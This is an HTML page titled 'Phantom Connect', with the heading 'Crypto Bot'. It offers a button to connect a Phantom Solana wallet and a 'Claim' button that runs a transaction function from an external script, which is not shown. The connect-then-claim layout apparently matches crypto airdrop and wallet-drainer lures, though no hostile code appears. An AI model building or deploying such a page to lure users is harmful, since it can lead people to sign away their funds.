<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Connect</title>

    <!-- Подключаем Solana Web3 -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

    <style>
        body {
            background-color: #001f3d;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        button {
            background-color: #0073e6;
            color: white;
            font-size: 24px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 10px;
        }

        button:hover {
            background-color: #005bb5;
        }

        #wallet-info {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h1>Crypto Bot</h1>

    <!-- Кнопка для подключения кошелька -->
    <button onclick="connectPhantom()">Подключить Phantom</button>

    <!-- Кнопка "Claim" -->
    <button onclick="didtrans()">Claim</button>

    <!-- Информация о кошельке -->
    <div id="wallet-info"></div>

    <script src="phant.js"></script>

</body>
</html>
